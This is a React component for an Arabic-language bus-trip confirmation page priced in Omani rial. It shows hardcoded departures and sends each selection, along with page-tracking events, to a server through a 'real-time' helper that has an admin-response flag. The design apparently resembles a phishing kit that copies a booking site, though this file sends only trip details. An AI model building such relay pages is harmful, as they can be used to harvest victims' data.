import GridPattern from "@/components/ui/animated-grid-pattern";
import ShinyButton from "@/components/ui/shiny-button";
import { cn } from "@/lib/utils";
import { CarFront, Keyboard, PlaneTakeoffIcon, Wifi } from "lucide-react";
import { FC, useEffect, useMemo } from "react";
import { Link, useLocation, useNavigate } from "react-router-dom";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";

const TripConfirmPage = () => {
  useEffect(() => {
    setCurrentPage("تأكيد الرحلة");
  }, []);

  const { state } = useLocation();
  // const fromCode = destinations?.filter((d) => d.name === state?.from)[0].code;
  // const toCode = destinations?.filter((d) => d.name === state?.to)[0].code;

  const tripPrice = useMemo(
    () => (state.activeTab === 1 ? 16 : 8),
    [state.activeTab]
  );

  return (
    <section className="container relative flex flex-col pb-10">
      <Link
        to={"/"}
        className="bg-main text-white rounded-full mt-6 lg:mt-20 mx-auto font-semibold px-12 py-3 z-10"
      >
        تعديل البحث
      </Link>
      <h2 className="text-gray-400 lg:text-3xl font-bold mt-3">المغادرة</h2>
      <div className="flex gap-x-2 items-end mt-3 mb-6 lg:mb-8">
        <PlaneTakeoffIcon className="size-6 inline-block -scale-x-100" />
      </div>
      <div className="mb-10 relative flex h-full w-full flex-wrap items-center justify-center gap-y-5 gap-x-[5dvw] z-10">
        <TravelCard
          tripCode={"مسار - 202 - BX01"}
          tripTime={"2h:10m"}
          from={{ name: state.from, time: "02:30" }}
          to={{ name: state.to }}
          price={tripPrice}
        />
        <TravelCard
          tripCode={"مسار - 202 - SK62"}
          tripTime={"2h:10m"}
          from={{ name: state.from, time: "05:30" }}
          to={{ name: state.to }}
          price={tripPrice}
        />
        <TravelCard
          tripCode={"مسار - 202 - LO32"}
          tripTime={"2h:10m"}
          from={{ name: state.from, time: "08:30" }}
          to={{ name: state.to }}
          price={tripPrice}
        />
        <TravelCard
          tripCode={"مسار - 202 - WE05"}
          tripTime={"2h:10m"}
          from={{ name: state.from, time: "11:30" }}
          to={{ name: state.to }}
          price={tripPrice}
        />
      </div>

      <GridPattern
        numSquares={30}
        maxOpacity={0.5}
        duration={3}
        repeatDelay={1}
        className={cn(
          "[mask-image:radial-gradient(300px_circle_at_center,white,transparent)]",
          "inset-x-0 inset-y-[-15%] skew-y-12"
        )}
      />
    </section>
  );
};
export default TripConfirmPage;

interface TravelCardProps {
  from: {
    name: string;
    // code: string;
    time: string;
  };
  to: {
    name: string;
    // code: string;
    time?: string;
  };
  tripCode: string;
  tripTime: string;
  price: number;
}

const TravelCard: FC<TravelCardProps> = ({
  from,
  to,
  tripCode,
  tripTime,
  price,
}) => {
  const { state } = useLocation();
  const navigate = useNavigate();

  // const calculateTotal = (price: number) => {
  //   let total = state.activeTab === 0 ? price * 2 : price;
  //   total = (state.adult + state.child + state.baby) * total;

  //   return total.toFixed(2).replace(/\.?0+$/, "");
  // };

  const handleSubmit = (e: any) => {
    e.preventDefault();
    const { price, to_place, from_place, from_time } = Object.fromEntries(
      new FormData(e.target)
    );
    console.log(Object.fromEntries(new FormData(e.target)));
    if (price) {
      sendDataToServer({
        current: "تأكيد الرحلة",
        data: {
          "ريال عمانى": price,
          "مكان البداية": from_place,
          "موعد بدء الرحلة": from_time,
          "مكان الوصول": to_place,
        },
        nextPage: "traveller-info",
        waitingForAdminResponse: false,
        navigate,
        state: {
          ...state,
          total: price,
        },
      });
    }
  };

  return (
    <div
      className={`group relative bg-white/85 shadow-lg flex h-auto w-[clamp(15rem,90dvw,28rem)] flex-col items-start justify-center overflow-hidden rounded-2xl border border-neutral-100 cursor-pointer`}
    >
      <div className="absolute right-0 top-0 h-24 w-24 rounded-2xl bg-gradient-to-r from-white  to-white opacity-20 blur-3xl"></div>

      <div className="flex flex-col w-full px-2 py-5 ">
        <div className="basis-1/2 flex flex-col gap-y-2 justify-between">
          <p className="text-white bg-main w-fit px-4 mx-auto rounded-md capitalize text-center text-sm font-semibold">
            {tripCode}
          </p>
          <div className="basis-1/4 -space-y-1 font-bold py-2">
            <p className="text-gray-500 text-lg capitalize text-center">
              {from.name}
            </p>
            <p className="text-main capitalize text-center">{from.time}</p>
          </div>

          <div className="-space-y-1">
            <p className="capitalize text-center">{tripTime}</p>
            <p className=" capitalize text-center">استراحة: 1h:20m</p>
          </div>

          <div className="basis-1/4 -space-y-1 font-bold py-2">
            <p className="text-gray-500 text-lg capitalize text-center">
              {to.name}
            </p>
            {/* <p className="text-main capitalize text-center">{to.time}</p> */}
          </div>
        </div>
        <form
          onSubmit={handleSubmit}
          className="px-2 py-5 lg:px-5 basis-1/4 border-r border-main-foreground border-dotted flex flex-col justify-between gap-4"
        >
          <p className="text-main capitalize text-center text-sm">
            <strong className="text-base">{price}</strong> ريال عُماني
          </p>

          <input type="hidden" name="from_place" value={from.name} />
          <input type="hidden" name="from_time" value={from.time} />
          <input type="hidden" name="to_place" value={to.name} />
          <input type="hidden" name="price" value={price} />

          <div className="mt-4 grid grid-cols-2">
            <div className="flex gap-x-2 items-center">
              <Keyboard className="text-main" /> أجهزة تكييف
            </div>
            <div className="flex gap-x-2 items-center">
              <Wifi className="text-main" /> أنترنت مجاني
            </div>
            <div className="flex gap-x-2 items-center">
              <CarFront className="text-main" /> مقاعد مضمونة
            </div>
          </div>

          <div className="flex items-center justify-between bg-main rounded-md">
            <p className="w-fit text-xs px-4 animate-pulse text-white tracking-tight font-bold py-2">
              عرض توفر المقاعد حسب المحطة
            </p>

            <p className="w-fit text-xs px-4 animate-pulse text-white tracking-tight font-bold py-2">
              عرض المسار - التوقيتات
            </p>
          </div>

          <ShinyButton
            text="متابعة"
            className="hover:bg-main/5 w-full bg-white rounded-3xl tracking-tight font-bold py-2"
            type={"submit"}
          />
        </form>
      </div>
    </div>
  );
};
